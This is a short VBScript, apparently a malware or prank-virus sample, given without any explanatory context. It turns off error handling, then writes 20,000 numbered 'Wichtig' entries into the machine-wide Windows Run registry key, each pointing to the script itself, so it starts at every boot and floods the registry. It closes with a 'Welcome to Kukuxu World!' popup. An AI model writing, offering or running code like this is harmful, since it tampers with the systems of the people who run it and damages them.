   on error resume next
   Dim KuKuxu
   Set KuKuxu = WScript.CreateObject("WScript.Shell")
   KuKuxu_e = 1
   KuKuxu_n = WScript.ScriptFullName;
   for KuKuxu_k = 1 to 20000
     KuKuxu_e = KuKuxu_e + 1
     KuKuxu.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Wichtig" & KuKuxu_e, KuKuxu_n
   next
   msgbox "Welcome to Kukuxu World!"
